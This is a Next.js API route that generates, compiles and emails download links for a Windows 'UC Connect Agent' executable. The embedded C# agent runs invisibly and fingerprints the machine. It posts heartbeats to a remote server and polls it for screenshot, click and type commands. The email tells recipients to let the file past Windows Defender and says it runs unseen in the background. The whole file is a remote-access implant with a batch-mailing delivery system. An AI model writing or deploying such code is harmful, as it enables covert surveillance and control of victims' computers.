import { NextRequest, NextResponse } from 'next/server';
import { sendEmailWithAttachment } from '@/lib/email';
import { supabase } from '@/lib/supabase';
import crypto from 'crypto';

const BUILD_SERVICE_URL = 'http://18.217.69.184:8080/api/Compile';

export async function POST(request: NextRequest) {
  try {
    const { recipientEmail, installToken, recipientEmails } = await request.json();

    // Support both single email and batch emails
    const emails = recipientEmails || [recipientEmail];
    
    if (!emails || emails.length === 0 || !installToken) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // Limit to 10 emails max
    if (emails.length > 10) {
      return NextResponse.json({ error: 'Maximum 10 emails allowed per batch' }, { status: 400 });
    }

    // Block Outlook domains until we get dedicated IP
    const blockedDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
    const blockedEmails = emails.filter(email => {
      const domain = email.split('@')[1]?.toLowerCase();
      return blockedDomains.includes(domain);
    });

    if (blockedEmails.length > 0) {
      return NextResponse.json({ 
        error: 'Outlook/Microsoft email addresses temporarily blocked due to deliverability issues',
        blockedEmails: blockedEmails 
      }, { status: 400 });
    }

    // Get user info
    const { data: user, error: userError } = await supabase
      .from('users')
      .select('*')
      .eq('install_token', installToken)
      .single();

    if (userError || !user) {
      return NextResponse.json({ error: 'Invalid install token' }, { status: 400 });
    }

    // Generate customized C# agent source
    const serverUrl = process.env.VERCEL_APP_URL || 'https://uc-universal-connect-omega.vercel.app';
    
    const agentSource = `using System;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;
using System.Management;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;

class UCAgent
{
    private static readonly string SERVER_URL = "${serverUrl}";
    private static readonly string INSTALL_TOKEN = "${installToken}";
    private static readonly HttpClient client = new HttpClient();
    private static string deviceId;

    static async Task Main()
    {
        try
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2
            
            deviceId = GetDeviceId();
            
            // Start heartbeat loop
            while (true)
            {
                await SendHeartbeat();
                await Task.Delay(30000); // 30 seconds
            }
        }
        catch (Exception ex)
        {
            // Silent fail - no error messages in production
        }
    }

    private static string GetDeviceId()
    {
        try
        {
            string computerName = Environment.MachineName;
            
            // Get motherboard serial number
            string mbSerial = "";
            using (var searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    mbSerial = obj["SerialNumber"]?.ToString() ?? "";
                    break;
                }
            }
            
            return $"{computerName}-{mbSerial}";
        }
        catch
        {
            return Environment.MachineName + "-" + Guid.NewGuid().ToString();
        }
    }

    private static async Task SendHeartbeat()
    {
        try
        {
            var payload = new
            {
                deviceId = deviceId,
                installToken = INSTALL_TOKEN,
                status = "online",
                timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                screenResolution = GetScreenResolution(),
                osName = GetOSName(),
                localIP = GetLocalIP(),
                publicIP = await GetPublicIP()
            };

            string json = System.Text.Json.JsonSerializer.Serialize(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            
            var response = await client.PostAsync($"{SERVER_URL}/api/heartbeat", content);
            
            if (response.IsSuccessStatusCode)
            {
                // Optionally handle screenshot requests or commands
                await HandleCommands();
            }
        }
        catch
        {
            // Silent fail
        }
    }

    private static async Task HandleCommands()
    {
        try
        {
            var response = await client.GetAsync($"{SERVER_URL}/api/commands?deviceId={deviceId}");
            if (response.IsSuccessStatusCode)
            {
                string jsonResponse = await response.Content.ReadAsStringAsync();
                // Handle any pending commands (screenshot, click, type, etc.)
                // Implementation depends on your command structure
            }
        }
        catch
        {
            // Silent fail
        }
    }

    private static string GetScreenResolution()
    {
        try
        {
            return $"{Screen.PrimaryScreen.Bounds.Width}x{Screen.PrimaryScreen.Bounds.Height}";
        }
        catch
        {
            return "1920x1080";
        }
    }

    private static string GetOSName()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj["Caption"]?.ToString() ?? "Windows";
                }
            }
            return "Windows";
        }
        catch
        {
            return "Windows";
        }
    }

    private static string GetLocalIP()
    {
        try
        {
            using (var socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 53);
                return ((IPEndPoint)socket.LocalEndPoint).Address.ToString();
            }
        }
        catch
        {
            return "127.0.0.1";
        }
    }

    private static async Task<string> GetPublicIP()
    {
        try
        {
            var response = await client.GetStringAsync("https://api.ipify.org");
            return response.Trim();
        }
        catch
        {
            return "unknown";
        }
    }
}`;

    // Send C# source to Build Service for compilation
    const buildResponse = await fetch(BUILD_SERVICE_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ sourceCode: agentSource }),
    });

    if (!buildResponse.ok) {
      throw new Error(`Build service failed: ${buildResponse.status}`);
    }

    // Get compiled executable
    const exeBuffer = await buildResponse.arrayBuffer();
    const exeBytes = new Uint8Array(exeBuffer);

    // Generate unique download ID
    const downloadId = crypto.randomUUID();
    
    // Store executable temporarily in Supabase storage
    const { error: uploadError } = await supabase.storage
      .from('temp-downloads')
      .upload(`${downloadId}.exe`, exeBytes, {
        contentType: 'application/octet-stream',
        cacheControl: '3600',
      });

    if (uploadError) {
      console.error('Upload error:', uploadError);
      throw new Error('Failed to store executable');
    }

    // Create download record with expiration
    const expiresAt = new Date();
    expiresAt.setHours(expiresAt.getHours() + 48); // 48 hour expiration

    const { error: recordError } = await supabase
      .from('download_links')
      .insert({
        download_id: downloadId,
        user_id: user.id,
        filename: 'UCAgent.exe',
        expires_at: expiresAt.toISOString(),
        created_at: new Date().toISOString()
      });

    if (recordError) {
      console.error('Record error:', recordError);
      throw new Error('Failed to create download record');
    }

    // Create download URL
    const downloadUrl = `${serverUrl}/api/download/${downloadId}`;

    // Email HTML template with download link
    const emailHtml = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>UC Universal Connect - Agent Ready</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f4f4f4; font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 30px;">
        
        <div style="text-align: center; margin-bottom: 30px;">
            <h1 style="color: #007acc;">🖥️ UC Universal Connect</h1>
            <h2 style="color: #333;">✅ Your Agent is Ready!</h2>
        </div>
        
        <p style="color: #555; line-height: 1.6;">
            Your custom UC Connect agent has been compiled successfully. 
            Click the button below to download your personalized executable.
        </p>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="${downloadUrl}" 
               style="display: inline-block; background: linear-gradient(45deg, #007acc, #0056b3); color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
                📥 Download UC Agent (.exe)
            </a>
        </div>
        
        <div style="background: #f8f9fa; border-left: 4px solid #007acc; padding: 15px; margin: 20px 0;">
            <strong>Quick Setup:</strong>
            <ol style="margin: 10px 0;">
                <li>Download and run the .exe file</li>
                <li>Allow Windows Defender if prompted</li>
                <li>Agent runs invisibly in background</li>
                <li>Check your dashboard for connected device</li>
            </ol>
        </div>
        
        <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0;">
            <strong>🔒 Security:</strong> This agent is uniquely compiled for your account. 
            Do not share with others. Download link expires in 48 hours.
        </div>
        
        <div style="text-align: center; color: #999; font-size: 12px; margin-top: 30px;">
            UC Universal Connect © 2026
        </div>
    </div>
</body>
</html>`;

    // Send emails to all recipients
    const emailResults = [];
    const errors = [];

    for (const email of emails) {
      try {
        const emailResult = await sendEmailWithAttachment(
          email,
          'UC Connect Agent - Ready for Download',
          emailHtml,
          '', // No filename
          Buffer.from(''), // No attachment
          user.id,
          user.subscription || 'free'
        );

        if (emailResult.success) {
          emailResults.push({ email, status: 'sent' });
        } else {
          emailResults.push({ email, status: 'failed', error: emailResult.message });
          errors.push(`${email}: ${emailResult.message}`);
        }
      } catch (error) {
        emailResults.push({ email, status: 'failed', error: error.message });
        errors.push(`${email}: ${error.message}`);
      }
    }

    const successCount = emailResults.filter(r => r.status === 'sent').length;
    const failureCount = emailResults.filter(r => r.status === 'failed').length;

    return NextResponse.json({ 
      success: successCount > 0,
      message: `Agent compiled. Emails: ${successCount} sent, ${failureCount} failed`,
      downloadId: downloadId,
      emailResults: emailResults,
      totalEmails: emails.length,
      successCount,
      failureCount
    });

  } catch (error) {
    console.error('Error:', error);
    return NextResponse.json(
      { error: 'Failed to send agent', details: error.message },
      { status: 500 }
    );
  }
}